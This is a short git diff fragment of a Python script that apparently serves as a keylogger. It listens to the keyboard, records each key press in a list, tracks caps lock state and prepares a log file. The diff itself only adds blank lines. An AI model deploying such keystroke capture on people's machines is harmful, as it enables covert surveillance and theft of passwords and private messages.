@@ -32,19 +32,23 @@ def sort_key(key):
 
 			# Handles Caps (on/off)
 			elif keyString == ("[CAPS_LOCK]"):
+
 				# Checks if last caps used was [CAPS_OFF], doesnt work properly is caps lock is enabled before program execution
 				if F == '1':
 					keyString = "[CAPS_ON]"
 					fullstr.append(keyString)
 					F = '0'
+
 				# If caps isnt ON (0) run this
 				else:
 					keyString = "[CAPS_OFF]"
 					fullstr.append(keyString)
 					F = '1'
+
 			# If the key isnt logged above or falls within the ASCII spectrum, accept the raw key
 			else:
 				fullstr.append(keyString)
+
 		# This captures normal ASCII characters
 		else:
 			keyString = str(key).strip("'")
@@ -58,6 +62,7 @@ def sort_key(key):
 def __main__():
 	print("\nOpening Log File...\n")
 	## Open log file here
+	
 	#starts listening to the keyboard
 	try:
 		with keyboard.Listener(on_press=sort_key) as l:
